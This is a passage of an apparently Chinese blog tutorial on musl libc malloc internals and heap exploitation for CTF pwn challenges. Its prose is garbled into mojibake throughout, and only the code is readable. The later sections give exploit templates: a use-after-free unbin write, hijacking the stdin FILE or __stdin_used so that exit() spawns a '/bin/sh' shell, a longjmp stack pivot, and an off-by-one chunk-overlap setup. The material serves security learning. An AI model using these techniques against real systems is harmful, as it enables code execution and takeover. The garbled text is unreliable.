(2)free\n\nè¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå¦‚æœcsizeæ²¡æœ‰è®¾ç½®æ ‡å¿—ä½ï¼Œå°±æœ‰ä¸¤ç§å¯èƒ½ï¼Œè¦ä¹ˆæ˜¯double freeï¼Œè¦ä¹ˆæ˜¯mmapå‡ºæ¥çš„chunkã€‚æ‰€ä»¥è¿›å…¥unmap_chunkå‡½æ•°ä»”ç»†åˆ¤æ–­ï¼Œå¦åˆ™å°±æ˜¯è®¾ç½®äº†æ ‡å¿—ä½ï¼Œæ­£å¸¸è¿›å…¥__bin_chunkå‡½æ•°è¿›è¡Œé‡Šæ”¾ã€‚\n\n```C\n////v1.2.0  src/malloc/malloc.cä¸­\nvoid free(void *p)\n{\n\tif (!p) return;\n\n\tstruct chunk *self = MEM_TO_CHUNK(p);\n\t//åˆ¤æ–­csizeæ˜¯å¦è®¾ç½®äº†æ ‡å¿—ä½\n\tif (IS_MMAPPED(self))\n\t\tunmap_chunk(self);//æ£€æµ‹psizeå­—æ®µ\n\telse\n\t\t__bin_chunk(self);//æ­£å¸¸é‡Šæ”¾\n}\n```\n\n#### â‘ unmap_chunk\n\n```c\n////v1.2.0  src/malloc/malloc.cä¸­\nstatic void unmap_chunk(struct chunk *self)\n{\n\tsize_t extra = self->psize;\n\tchar *base = (char *)self - extra;\n\tsize_t len = CHUNK_SIZE(self) + extra;\n\t/* Crash on double free */\n    //å¦‚æœpsizeå­—æ®µè®¾ç½®inuseä½ï¼Œç›´æ¥crash\n\tif (extra & 1) a_crash();\n    //å¦åˆ™ä½œä¸ºmmap chunkè¿›å…¥é‡Šæ”¾å‡½æ•°\n\t__munmap(base, len);\n}\n```\n\n#### â‘¡__bin_chunk\n\næ­£å¸¸çš„é‡Šæ”¾å‡½æ•°ï¼Œé¦–å…ˆåˆå¹¶ chunk å‰åçš„ç©ºé—² chunkã€è®¾ç½® binmap å’Œ chunk æ ‡å¿—ä½ï¼Œæœ€åå°† chunk æ’å…¥åˆ°å¯¹åº”çš„ bin é“¾è¡¨ä¸­ã€‚\n\n```c\n////v1.2.0  src/malloc/malloc.cä¸­\nvoid __bin_chunk(struct chunk *self)\n{\n\tstruct chunk *next = NEXT_CHUNK(self);\n\tsize_t final_size, new_size, size;\n\tint reclaim=0;\n\tint i;\n\n\n\tfinal_size = new_size = CHUNK_SIZE(self);\n\n\t/* Crash on corrupted footer (likely from buffer overflow) */\n   \t//è‹¥ä¸‹ä¸€ä¸ª chunk çš„ psize ä¸ç­‰äº self çš„ csizeï¼Œåˆ™ crash\n    //ç›¸å½“äºæ£€æµ‹pre_sizeå’Œsize\n\tif (next->psize != self->csize) a_crash();\n\n    \n    //æ£€æµ‹è¯¥chunkçš„å‰åæ˜¯å¦å¤„äºç©ºé—²çŠ¶æ€\n\tfor (;;) {\n        //å¯¹äºä¸Šä¸€ä¸ªchunkï¼Œæ£€æµ‹å½“å‰chunkçš„psizeä½\n        //å¯¹äºä¸‹ä¸€ä¸ªchunkï¼Œæ£€æµ‹ä¸‹ä¸€ä¸ªchunkçš„csizeä½\n\t\tif (self->psize & next->csize & C_INUSE) {\n            //å‰åå¤„äºuseçŠ¶æ€ï¼Œé‚£ä¹ˆå¯¹å½“å‰chunkè¿›è¡Œé‡Šæ”¾å³å¯\n            //æ¸…é™¤å½“å‰chunkçš„inuseä½ï¼Œä¸‹ä¸€ä¸ªchunkçš„psizeä½\n\t\t\tself->csize = final_size | C_INUSE;\n\t\t\tnext->psize = final_size | C_INUSE;\n\t\t\ti = bin_index(final_size);\n\t\t\tlock_bin(i);\n\t\t\tlock(mal.free_lock);\n            //é€€å‡ºå¾ªç¯æ£€æµ‹\n\t\t\tif (self->psize & next->csize & C_INUSE)\n\t\t\t\tbreak;\n\t\t\tunlock(mal.free_lock);\n\t\t\tunlock_bin(i);\n\t\t}\n\n        //å‘ä¸Šåˆå¹¶ç©ºé—²çš„chunk\n\t\tif (alloc_rev(self)) {\n\t\t\tself = PREV_CHUNK(self);\n\t\t\tsize = CHUNK_SIZE(self);\n\t\t\tfinal_size += size;\n\t\t\tif (new_size+size > RECLAIM && (new_size+size^size) > size)\n\t\t\t\treclaim = 1;\n\t\t}\n\n        //å‘ä¸‹åˆå¹¶ç©ºé—²çš„chunk\n\t\tif (alloc_fwd(next)) {\n\t\t\tsize = CHUNK_SIZE(next);\n\t\t\tfinal_size += size;\n\t\t\tif (new_size+size > RECLAIM && (new_size+size^size) > size)\n\t\t\t\treclaim = 1;\n\t\t\tnext = NEXT_CHUNK(next);\n\t\t}\n\t}\n\n    //è®¾ç½®å¯¹åº”binmapçš„æ ‡å¿—ä½ï¼Œbins[i]\n\tif (!(mal.binmap & 1ULL<<i))\n\t\ta_or_64(&mal.binmap, 1ULL<<i);\n\n\tself->csize = final_size;\n\tnext->psize = final_size;\n\tunlock(mal.free_lock);\n\n    //å°†å½“å‰chunkæ”¾åˆ°bins[i]çš„å°¾éƒ¨ï¼ŒFILOçš„å½¢å¼\n\tself->next = BIN_TO_CHUNK(i);\n\tself->prev = mal.bins[i].tail;\n\tself->next->prev = self;\n\tself->prev->next = self;\n\n\t/* Replace middle of large chunks with fresh zero pages */\n\tif (reclaim) {\n\t\tuintptr_t a = (uintptr_t)self + SIZE_ALIGN+PAGE_SIZE-1 & -PAGE_SIZE;\n\t\tuintptr_t b = (uintptr_t)next - SIZE_ALIGN & -PAGE_SIZE;\n#if 1\n\t\t__madvise((void *)a, b-a, MADV_DONTNEED);\n#else\n\t\t__mmap((void *)a, b-a, PROT_READ|PROT_WRITE,\n\t\t\tMAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);\n#endif\n\t}\n\n\tunlock_bin(i);\n}\n```\n\n## 4.é™æ€å †å†…å­˜\n\nåœ¨Libcåˆå§‹åŒ–æ—¶ï¼Œå¦‚ä¸‹\n\n```C\nvoid __dls3(size_t *sp)\n{\n    [...]\n    // ldso/dynlink.c L1839-L1840\n    /* Donate unused parts of app and library mapping to malloc */\n    reclaim_gaps(&app);\n    reclaim_gaps(&ldso);\n    [...]\n}\n```\n\nä¼šè°ƒç”¨`reclaim_gaps`å‡½æ•°æŸ¥æ‰¾ç¨‹åºå’Œ libc åº“çš„ç©ºé—²å†…å­˜ï¼Œé€šå¸¸æ˜¯ä½äºDataæ®µä¸Šï¼Œè¯¥å‡½æ•°ä¸­ä¼šè°ƒç”¨`__malloc_donate`å‡½æ•°å°†ç©ºé—²å†…å­˜é‡Šæ”¾åˆ° binä¸­ã€‚\n\n```C\n// ldso/dynlink.c L526-L552\n/* A huge hack: to make up for the wastefulness of shared libraries\n * needing at least a page of dirty memory even if they have no global\n * data, we reclaim the gaps at the beginning and end of writable maps\n * and \"donate\" them to the heap. */\n\nstatic void reclaim(struct dso *dso, size_t start, size_t end)\n{\n    // é¿å¼€ RELRO æ®µ\n    if (start >= dso->relro_start && start < dso->relro_end) start = dso->relro_end;\n    if (end   >= dso->relro_start && end   < dso->relro_end) end = dso->relro_start;\n    if (start >= end) return;\n    char *base = laddr_pg(dso, start);\n    // ä½¿ç”¨ __malloc_donate å‡½æ•°å°†å†…å­˜é‡Šæ”¾åˆ° bin ä¸­\n    __malloc_donate(base, base+(end-start));\n}\n\nstatic void reclaim_gaps(struct dso *dso)\n{\n    Phdr *ph = dso->phdr;\n    size_t phcnt = dso->phnum;\n\n    // éå†æ¯ä¸€ä¸ªæ®µ\n    for (; phcnt--; ph=(void *)((char *)ph+dso->phentsize)) {\n        // æ¡ä»¶ 1ï¼šæ®µä¸å±äºå¯åŠ è½½æ®µï¼ˆPT_LOADï¼‰\n        if (ph->p_type!=PT_LOAD) continue;\n        // æ¡ä»¶ 2ï¼šæ®µå¯è¯»å¯å†™\n        if ((ph->p_flags&(PF_R|PF_W))!=(PF_R|PF_W)) continue;\n        // åœ¨æ®µæ‰€å±çš„å†…å­˜é¡µä¸­ï¼Œå°†æ®µå‰åçš„ç©ºé—²å†…å­˜ä¼ é€’ç»™ reclaim å‡½æ•°\n        reclaim(dso, ph->p_vaddr & -PAGE_SIZE, ph->p_vaddr);\n        reclaim(dso, ph->p_vaddr+ph->p_memsz,\n            ph->p_vaddr+ph->p_memsz+PAGE_SIZE-1 & -PAGE_SIZE);\n    }\n}\n```\n\nåˆå§‹åŒ–ç»“æŸåï¼Œåœ¨binsä¸­ä¼šå¤šå‡ºå‡ ä¸ªchunk\n\n![image-20220217112724849](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171127046.png)\n\nä¸ä¸€å®šæ˜¯ä¸‰ä¸ªchunkï¼Œå¤šå°‘ä¸ªéƒ½æœ‰å¯èƒ½ï¼Œä¸»è¦çœ‹ç¨‹åºæˆ–è€…libcä¸­æ˜¯å¦å­˜åœ¨ç©ºé—²çš„å†…å­˜ã€‚ä¹‹åå†è¿›è¡Œå †å†…å­˜åˆ†é…æ—¶ï¼Œå°±ä¼šåœ¨è¿™ä¸ªåŸºç¡€ä¸Šè¿›è¡Œåˆ†é…ï¼Œè€Œéåœ¨æ‰€æœ‰binséƒ½æ˜¯ç©ºçš„çŠ¶æ€è¿›è¡Œåˆ†é…ã€‚\n\n\n\n## 5.åˆ©ç”¨æ–¹å¼\n\n### (1)æ³„éœ²åœ°å€\n\n#### â‘ åŸºäºé™æ€å †å†…å­˜\n\né‚£ä¹ˆåŸºäºé™æ€å †å†…å­˜çš„å­˜åœ¨ï¼Œç”±äºæœ€å¼€å§‹è¿›è¡Œåˆ†é…æ˜¯åœ¨å­˜åœ¨é™æ€å †å†…å­˜çš„æƒ…å†µä¸‹åˆ†é…çš„ï¼Œæ‰€ä»¥å¦‚æœç”³è¯·çš„chunkçš„sizeä¾æ®ç”³è¯·è§„åˆ™å¯ä»¥å¯¹é™æ€å †å†…å­˜è¿›è¡Œåˆ‡å‰²ï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œåˆ‡å‰²ï¼Œç”±äºæ˜¯åˆ‡å‰²çš„chunkï¼Œé‚£ä¹ˆæ­¤æ—¶è¿”å›çš„chunkçš„å°±ä¼šè‡ªç„¶è€Œç„¶å¸¦ä¸Šåœ°å€ã€‚\n\nåŒæ ·çš„ï¼Œå½“ç¢°ä¸Šé™æ€å †å†…å­˜åˆå§‹åŒ–ä¹‹åï¼Œåœ¨ä¸€ä¸ªbinsä¸­åŒæ—¶å­˜åœ¨ç¨‹åºä¸­çš„chunkå’Œlibcä¸­çš„chunkæ—¶ï¼Œæˆ‘ä»¬å°†è¯¥chunkåˆ‡å‰²æˆ–è€…ç”³è¯·å‡ºæ¥ï¼Œå°±å¯ä»¥åŒæ—¶æ³„éœ²Libcåœ°å€å’Œç¨‹åºELFåœ°å€äº†ã€‚\n\n#### â‘¡åŸºäºbins\n\nå‰é¢æåˆ°ï¼Œé‡Šæ”¾åˆ°binsä¸­headæŒ‡é’ˆä¸‹chunkå¿…ç„¶ä¼šå¸¦ä¸Šlibcåœ°å€ï¼Œé‚£ä¹ˆç›´æ¥ç”³è¯·å›æ¥å°±å¯ä»¥è¿›è¡ŒLibcåœ°å€çš„æ³„éœ²\n\n\n\n### (2)getshell\n\n#### â‘ UAF\n\n##### æ–¹æ³•ä¸€ï¼š\n\nè¿™ç§æƒ…å†µå¯ä»¥ç›´æ¥é€šè¿‡æ”¹æ‰ä½äºbinä¸­headå¤´éƒ¨chunkçš„nextå’ŒprevæŒ‡é’ˆï¼Œç„¶åä»è¯¥binä¸­ç”³è¯·chunkï¼Œé€šè¿‡unbinå‡½æ•°ä¸­çš„å¦‚ä¸‹æ“ä½œå³å¯è¿›è¡Œä»»æ„åœ°å€ä»»æ„å†™ï¼Œå…¶ä¸­çš„cä¹Ÿå°±æ˜¯binä¸­çš„headæŒ‡å‘çš„chunkã€‚\n\n```C\nc->prev->next = c->next;\nc->next->prev = c->prev;\n```\n\nç›¸å…³çš„expæ¨¡æ¿å¦‚ä¸‹\n\n```python\nbins_a0h_addr = libc_base + 0x292b28\nstdin_addr = libc_base + 0x292200\nadd_malloc(0x1000)\nfree(0)\nedit(0,0x10,p64(bins_a0h_addr-0x10)+p64(stdin_addr-0x10))\nadd_malloc(0x1000)\nedit(0,0x10,p64(stdin_addr-0x10)+p64(bins_a0h_addr-0x10))\nadd_malloc(0x1000)\n```\n\nå¯ä»¥è¿ç»­ç”¨ä¸¤æ¬¡ä¹Ÿæ²¡å•¥é—®é¢˜ï¼Œç”±äºæˆ‘ä»¬åŠ«æŒäº†è¿™ä¸ªæ”¹å†™æŒ‡é’ˆçš„æ“ä½œï¼Œæ‰€ä»¥åœ¨ç›¸å¯¹äºçš„binç»“æ„ä¸­çš„headå’ŒtailæŒ‡é’ˆå¹¶æ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚\n\nç”¨ä¸¤æ¬¡çš„åŸå› æ˜¯éœ€è¦åœ¨`stdin->prev`å’Œ`stdin->next`éƒ½å†™ä¸‹ä¸€ä¸ªå¯å†™åœ°å€ï¼Œè¿™æ ·ä¹‹åå†ä»å¯¹åº”binçš„headä¸­ç”³è¯·å‡ºæ¥æ—¶ï¼Œç»è¿‡unbinå‡½æ•°ä¸­çš„æŒ‡é’ˆèµ‹å€¼æ“ä½œä¸ä¼šå‡ºé”™ï¼Œå¦åˆ™å°±ä¼šå‡ºç°ä¸å¯å†™æˆ–è€…é›¶åœ°å€å–å€¼æ“ä½œå¯¼è‡´å¤±è´¥ã€‚\n\nä»¥ä¸Šæ“ä½œç»“æŸåå°±å¯ä»¥çœ‹åˆ°åœ¨bins[4]ï¼Œä¹Ÿæ˜¯0xa0å¤§å°å¯¹åº”çš„binä¸­çš„headæŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºstdin_addr-0x10ï¼ŒåŒæ—¶å¯¹åº”çš„stdinç»“æ„ä½“çš„prevå’ŒnextæŒ‡é’ˆä¹Ÿæ˜¯å¯å†™åœ°å€\n\n![image-20220217185755489](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171857586.png)\n\nä¹‹åä»ä¸­bins[4]ä¸­ç”³è¯·chunkå³å¯ç”³è¯·å‡ºstdinç»“æ„ä½“ï¼Œä¹‹åå¯¹åº”ä¿®æ”¹æ‰€éœ€æ•°æ®å³å¯\n\n```\nf->wpos != f->wbase\nf->flag = \"/bin/shx00\"\nf->write = system\nf->lock=0\n```\n\nç›¸åº”expæ¨¡æ¿å¦‚ä¸‹\n\n```\nadd_malloc(0xa0-0x20)\nedit(3,0x50+0x50,\"/bin/sh\\x00\"+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(system_addr) + \\\n\tp64(0x0)*8)\n```\n\næœ€åè°ƒç”¨exit()å‡½æ•°å³å¯ï¼Œè°ƒç”¨é“¾ä¸º`exit()->__stdio_exit_needed()(//æˆ–è€…æ˜¯__stdio_exit)->close_file(__stdin_used)->f->write(f, 0, 0);`è¿™é‡Œçš„få³æ˜¯ä¼ å…¥çš„stdin\n\n```\n// src/stdio/__stdio_exit.c\nstatic void close_file(FILE *f)\n{\n\tif (!f) return;\n\tFFINALLOCK(f);\n\tif (f->wpos != f->wbase) f->write(f, 0, 0);\n\tif (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);\n}\n\nvoid __stdio_exit(void)\n{\n\tFILE *f;\n\tfor (f=*__ofl_lock(); f; f=f->next) close_file(f);\n\tclose_file(__stdin_used);\n\tclose_file(__stdout_used);\n\tclose_file(__stderr_used);\n}\n```\n\nä¸è¿‡ç”±äº`FFINALLOCK(f);`çš„å­˜åœ¨ï¼Œå¦‚æœè¿›å…¥è¿™ä¸ªå‡½æ•°ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šå´©æºƒï¼Œä¹Ÿå¯èƒ½æ˜¯æŸäº›è®¾ç½®ä¸Šçš„é—®é¢˜å—ï¼Ÿæ‰€ä»¥ä¸ºäº†ä¸è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆéœ€è¦å°†`f->lock`ç½®é›¶å³å¯\n\n![image-20220217183236401](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171832664.png)\n\næœ€åå³å¯è°ƒç”¨f->writeï¼Œå³åŠ«æŒçš„systemå‡½æ•°ï¼Œrdiä¸ºstdinç»“æ„ä½“ï¼Œæ¥getshell\n\næœ€ç»ˆå°æ¨¡æ¿å¦‚ä¸‹\n\n```python\nbins_a0h_addr = libc_base + 0x292b28\nstdin_addr = libc_base + 0x292200\nadd_malloc(0x1000)\nadd_malloc(0xa0-0x20)\nadd_malloc(0xa0-0x20)\nfree(1)\nfree(0)\ndbg()\nedit(0,0x10,p64(bins_a0h_addr-0x10)+p64(stdin_addr-0x10))\nadd_malloc(0x1000)\nedit(0,0x10,p64(stdin_addr-0x10)+p64(bins_a0h_addr-0x10))\nadd_malloc(0x1000)\n#dbg()\nadd_malloc(0xa0-0x20)\n#pause()\nedit(5,0x50+0x50,\"/bin/sh\\x00\"+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(system_addr) + \\\n\tp64(0x0)*8)\n#dbg()\nexit()\np.interactive()\n```\n\n##### æ–¹æ³•äºŒï¼š\n\nè¿™ä¸ªç›¸å¯¹æ–¹æ³•ä¸€å°±ç®€å•å¾ˆå¤šï¼Œåªéœ€è¦ä¸€ä¸ªä»»æ„åœ°å€å†™å³å¯ï¼Œæ€è·¯ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚\n\nè§‚å¯Ÿä¸Šé¢çš„`__stdio_exit`å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå…¶å®å®ƒæœ€åä½¿ç”¨çš„æ˜¯`__stdin_used`ï¼Œè€Œè¿™ä¸ªæ•°æ®ä¿å­˜ç€stdinç»“æ„ä½“æŒ‡é’ˆï¼Œå¹¶ä¸”è¯¥æ•°æ®ä½äºlibcä¸Šå¯è¯»å¯å†™å¤„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åŠ«æŒ`__stdin_used`ä¸‹çš„stdinç»“æ„ä½“æŒ‡é’ˆåˆ°å †ä¸Šï¼Œåœ¨å †ä¸Šä¼ªé€ æˆ‘ä»¬çš„æ•°æ®ï¼Œä»è€Œåœ¨è°ƒç”¨exitå‡½æ•°æ—¶ä»å †ä¸Šå–æ•°æ®æ‰§è¡Œæœ€ç»ˆçš„å‘½ä»¤ã€‚\n\n```python\nexecve_addr = libc_base + libc.sym['execve']\nstdin_usedpoint_addr = libc_base + 0x292430\nheap_addr = 0x555555759000\nadd_malloc(0x1000)\nfree(0)\nedit(0,0x10,p64(stdin_usedpoint_addr-0x10-0x8)+p64(heap_addr+0x50))\nadd_malloc(0x1000)\nedit(0,0x30+0x50+0x50,'\\x00'*0x30+\"/bin/sh\\x00\"+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(execve_addr) + \\\n\tp64(0x0)*8)\nexit()\np.interactive()\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ€åçš„æ‰§è¡Œå‘½ä»¤å¤„ï¼Œrdiè¢«æˆåŠŸæ›´æ”¹ä¸ºå †ä¸Šçš„åœ°å€ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å¯¹åº”å¯»æ‰¾åç§»æ‰¾åˆ°äº†`execve`å‡½æ•°åœ°å€ï¼Œæ›´åŠ ç®€ä¾¿äº†\n\n![image-20220217193622906](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171936093.png)\n\nåŒæ—¶ç”±äºæœ€åè°ƒç”¨çš„`f->write(f,0,0)`ï¼Œå…¶ä¸­rsiå’Œrdxå¿…å®šä¸º0ï¼Œæ‰€ä»¥æ¨èè¿˜æ˜¯ä½¿ç”¨execveå‡½æ•°ï¼Œé˜²æ­¢systemå‡½æ•°å‡ºç°éé¢„æœŸçš„ä¸€äº›æ ˆç¯å¢ƒæˆ–è€…å…¶ä»–å˜åŒ–ï¼Œå¯¼è‡´æ— æ³•getshellã€‚\n\n##### æ–¹æ³•ä¸‰ï¼š\n\nåŒæ ·çš„ï¼Œå¦‚æœæ˜¯ORWï¼Œå†è¿›ä¸€æ­¥çš„è¯ï¼Œæ˜¯ä¸æ˜¯muslä¸­ä¹Ÿå­˜åœ¨ç±»ä¼¼äºsetcontextä¹‹ç±»å¯ä»¥ç”šè‡³æ ˆçš„gadgetå‘¢ï¼Œå…¶å®æ˜¯æœ‰çš„ï¼Œåœ¨`longjmp`å‡½æ•°ä¸­ï¼Œ\n\n```\n//1.1.24çš„libcä¸­\n.text:0000000000048B96                 mov     rdx, [rdi+30h]\n.text:0000000000048B9A                 mov     rsp, rdx\n.text:0000000000048B9D                 mov     rdx, [rdi+38h]\n.text:0000000000048BA1                 jmp     rdx\n```\n\nç›¸å¯¹åº”åœ¨1.2.0ä»¥ä¸Šç‰ˆæœ¬ä¸­ä¹Ÿæ˜¯æœ‰ç±»ä¼¼çš„ï¼Œä¹Ÿåœ¨`longjmp`å‡½æ•°ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†`__stdin_used`åŠ«æŒä¸ºå †åœ°å€ï¼Œåœ¨å †ä¸Šå¸ƒç½®ä¸‹æˆ‘ä»¬çš„ORWæ¥è¿›è¡Œæ”»å‡»\n\n\n\n#### â‘¡off-by-one\n\nä¸€èˆ¬åœ¨Muslç¯å¢ƒä¸‹çš„å †é¢˜ï¼ŒåŸºæœ¬ä¸å­˜åœ¨off-by-nullçš„æƒ…å†µçš„ï¼Œå› ä¸ºå½“å‰chunkçš„csizeä¼šå’Œä¸‹ä¸€ä¸ªchunkçš„psizeè¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœä¸ç­‰ä¼šcrashã€‚\n\n```c\n//__bin_chunkå‡½æ•°ä¸­\n//è‹¥ä¸‹ä¸€ä¸ª chunk çš„ psize ä¸ç­‰äº self çš„ csizeï¼Œåˆ™ crash\n    //ç›¸å½“äºæ£€æµ‹pre_sizeå’Œsize\n\tif (next->psize != self->csize) a_crash();\n```\n\nè€Œç”±äºä¸é‡ç”¨psizeå­—æ®µï¼Œå°±ç®—æº¢å‡ºä¸€ä¸ªé›¶å­—èŠ‚ï¼Œä¹Ÿæ— æ³•è¦†ç›–åˆ°csizeå­—æ®µï¼Œåªèƒ½è¦†ç›–åˆ°pszieå­—æ®µï¼Œæ‰€ä»¥å½“å¯ä»¥æº¢å‡ºä¸€ä¸ªä»»æ„å­—èŠ‚æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹psizeå­—æ®µï¼Œå‘ä¸Šè¿›è¡Œå †å—é‡å åˆå¹¶ã€‚\n\n```python\nadd_malloc(0x40-0x10)\nadd_malloc(0x40-0x10)\nadd_malloc(0x40-0x10)\nadd_malloc(0x40-0x10)\nedit(1,(0x40-0x10+0x1),'\\x00'*(0x40-0x10)+p8(0x80))\nfree(0)\nfree(2)\n```\n\nè¿™æ ·chunk0å’Œchunk1å°±ä¼šåˆå¹¶åˆ°ä¸€å—è¿›å…¥binä¸­ï¼Œåˆ¶é€ chunk1çš„å †å—é‡å ï¼Œä½†æ˜¯ç”±äºå‡½æ•°æœºåˆ¶é—®é¢˜ï¼Œchunk2å®é™…ä¸Šæ˜¯å¹¶æ²¡æœ‰è¢«é‡Šæ”¾åˆ°binä¸­çš„ã€‚\n\n##### æœªåˆå¹¶å‰å¦‚ä¸‹ï¼š\n\n![image-20220218113100251](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181131379.png)\n\n##### åˆå¹¶åå¦‚ä¸‹ï¼š\n\n![image-20220218113620389](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181136514.png)\n\né‚£ä¹ˆä¹‹åå°†chunk1é‡Šæ”¾ï¼Œåœ¨å°†chunk0+chunk1ç”³è¯·å›æ¥ï¼Œå³å¯åˆ¶é€ ä¸€ä¸ªUAFäº†ã€‚\n\n```python\nedit(1,(0x40-0x10+0x1),'\\x00'*(0x40-0x10)+p8(0x41))\nfree(1)\nadd_malloc(0x80-0x10)\n```\n\nå¦‚ä¸‹æ‰€ç¤º\n\n![image-20220218120440262](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181204446.png)\n\næœ‰äº†UAFä¹‹åå°±å¥½åŠå¾ˆå¤šäº†ï¼Œè¿˜æ˜¯å‚è€ƒä¸Šè¿°çš„UAFæƒ…å†µ\n\n\n\n# äºŒã€1.2.1åŠä¹‹åç‰ˆæœ¬\n\nè¿™ä¸ªç‰ˆæœ¬ä¸‹çš„å †ç®¡ç†æ–¹å¼æœ‰äº†å¾ˆå¤§çš„å˜åŒ–ï¼Œå¯ä»¥è¯´å’ŒåŸæ¥çš„éƒ½ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿äº†ã€‚\n\nå‚è€ƒ\n\n[æ–°ç‰ˆmusl-libc mallocæºç åˆ†æä¸è°ƒè¯• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/252293)\n\n[ä»musl libc 1.1.24åˆ°1.2.2 å­¦ä¹ pwnå§¿åŠ¿ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/253566#h3-2)\n\n[musl-1.2.xå †éƒ¨åˆ†æºç åˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/246929)\n\n## 1.æ•°æ®ç»“æ„\n\n### (1)chunkç»“æ„\n\nåœ¨è¯¥ç‰ˆæœ¬ä¹‹åï¼Œå¹¶æ²¡æœ‰åƒä¹‹å‰ä¸€æ ·å°†chunkç»“æ„å®šä¹‰åœ¨ä»£ç é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½è‡ªå·±æ¥è¿›è¡ŒçŒœæµ‹ï¼Œå¤§è‡´å¦‚ä¸‹\n\n```C\nstruct chunk {\n    uint8_t res;        // ä¿ç•™,ä¸€ç›´ä¸º\\x00\n    uint8_t idx:5;      \n    //ä½5bitä½œä¸ºidxè¡¨ç¤ºè¿™æ˜¯groupä¸­ç¬¬å‡ ä¸ªchunk, é«˜3bitä½œä¸ºreserved\n    //å¦‚æœè¯¥chunkè¢«freeï¼Œåˆ™è¯¥å­—èŠ‚è¢«ç½®ä¸º0xff,åŒæ—¶ä¸‹é¢çš„offsetè¢«ç½®ä¸º0\n    uint8_t reserved:3;  // ä¸çŸ¥é“å¹²å•¥çš„\n    uint16_t offset;     //ä¸ç¬¬ä¸€ä¸ªchunkçš„åç§»\n    \t\t\t\t\t//å¦‚æœä¸º4åˆ™chunk_addr-0x40=first_chunk_addr\n    /*å¦‚æœæ˜¯groupä¸­çš„ç¬¬ä¸€ä¸ªchunkï¼Œé‚£ä¹ˆè¿˜æœ‰å¦‚ä¸‹æ•°æ®\n    struct meta* meta;//æŒ‡å‘ç®¡ç†è¯¥groupçš„meta\n\tunsigned char active_idx:5;//å æ®5bytes,è¡¨ç¤ºè¯¥groupä¸­å…±æœ‰å‡ ä¸ªslot,ä¹Ÿå°±æ˜¯chunk\n\tchar pad[UNIT - sizeof(struct meta *) - 1];\n    */\n    char user_data[];    // æœ€åä¸€å­—èŠ‚éœ€è¦ä¸º\\x00\n    char remain_data[];  // å‰©ä½™ç©ºé—´æœ€åä¸€å­—èŠ‚éœ€è¦ä¸º\\x00\n    uint32_t remain_size; // chunkå‰©ä½™sizeå¤§å°\n};\n```\n\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œchunkåˆ†å¸ƒå¤§æ¦‚å¦‚ä¸‹\n\n![image-20220318114135427](C:/Users/007/Desktop/202203181141533.png)\n\nå…¶ä¸­chunk1çš„idxå³ä¸ºè¯¥groupä¸­çš„ç¬¬1ä¸ªChunkï¼Œä¸º0x1\n\nè€Œè¿™æ•´ç‰‡å¼€è¾Ÿçš„ç©ºé—´ï¼ŒåŒ…æ‹¬æœªè¢«åˆ†é…çš„chunkï¼Œå¦‚ä¸‹é¢çš„é©¬èµ›å…‹éƒ¨åˆ†ä¸”ä¸€ç›´å‘ä¸‹å»¶ç”³åˆ°ä¸€å®šä½ç½®ï¼Œè¿åœ¨ä¸€èµ·å«åš`group`\n\n### (2)group\n\nä¹Ÿå°±æ˜¯é€šè¿‡mmapå¼€è¾Ÿå‡ºæ¥ç”¨æ¥å­˜æ”¾chunkçš„ä¸€ç‰‡ç©ºé—´ï¼Œå®šä¹‰å¦‚ä¸‹\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct group {\n\tstruct meta *meta;//å³ä¸Šå›¾å¤´éƒ¨chunk0ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆåœ°å€\n\tunsigned char active_idx:5;//å æ®5bytes\n\tchar pad[UNIT - sizeof(struct meta *) - 1];\n\tunsigned char storage[];\n    //å³ä»å¤´éƒ¨chunk0ä»0x41å¼€å§‹ä¸€ç›´å¾€ä¸‹çš„éƒ¨åˆ†ï¼ŒåŒ…æ‹¬chunk1,chunk2..ä»¥åŠæœªè¢«åˆ†é…å‡ºå»çš„Chunk\n};\n```\n\nä¸”groupä¸­å­˜æ”¾çš„Chunkçš„sizeæ˜¯åœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼Œé€šè¿‡å¦‚ä¸‹å®šä¹‰ä»¥åŠè®¡ç®—\n\n```C\n#define IB 4\n\nconst uint16_t size_classes[] = {\n    1, 2, 3, 4, 